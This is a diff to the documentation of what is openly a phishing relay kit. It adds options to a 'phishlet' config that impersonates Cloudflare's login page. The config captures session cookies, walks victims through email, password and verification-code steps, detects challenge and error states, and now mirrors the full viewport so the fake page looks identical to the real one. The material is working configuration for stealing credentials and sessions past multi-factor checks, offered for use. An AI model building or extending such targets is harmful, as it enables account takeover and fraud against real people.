@@ -51,6 +51,7 @@ name as `window.__RELAY_TARGET__`; the sidecar picks
 phishlet: cloudflare          # session-import target name
 flow: generic                 # generic | google (google = dedicated state machine)
 signin_url: "https://dash.cloudflare.com/login"   # {hl} placeholder supported
+mirror: full                   # card (crop, Google-style) | full (whole viewport)
 done_hosts: ["dash.cloudflare.com"]               # done only when NO input visible
 cookie_domains: ["cloudflare.com"]                # capture filter
 asset_hosts: ["cloudflare.com"]                   # CSS/asset mirror whitelist
@@ -63,6 +64,7 @@ inputs:                        # comma-separated selector lists allowed
 buttons:
   next: ["button[type='submit']", "button:has-text('Sign in')"]
 classify:                      # en/vi strings for state detection
+  reload: ["problem with verification"]   # auto-reload the real page (max 2)
   challenge: ["verification code", "mã xác minh"]
   bad_account: ["user not found"]
   wrong_password: ["incorrect email or password"]
@@ -75,6 +77,9 @@ page:                          # victim-page branding (template fills these)
   card_radius: 8
   footer_left: "Cloudflare"   footer_right: "Terms   Privacy"
 ```
+
+`mirror: full` streams the entire viewport (2-column layouts look 1:1 with
+the origin); the default card crop keeps the Google-style centered-card look.
 
 Adding a target = writing this one file. `flow: generic` walks visible inputs
 in order (email → password → code) — single-card forms (email + password on
